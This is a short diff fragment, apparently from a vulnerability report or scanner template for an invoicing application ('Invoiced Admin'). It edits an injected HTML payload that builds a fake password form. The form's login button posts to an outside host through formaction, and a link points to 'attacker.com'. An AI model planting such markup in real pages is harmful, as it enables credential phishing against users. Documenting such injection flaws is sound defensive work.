@@ -13,7 +13,7 @@ info:
                 <input type="password" name="password" size="20">
             </div>
             <div class="form-group">
-                <button name=xss type=submit formaction='https://google.com'>I get consumed!
+                <button type="submit" class="btn btn-default" formaction=//google.com>Login</button>
             </div>
         </form>
  <a href="//attacker.com">here</a><p>Regards</p><p>Invoiced Admin</p> '
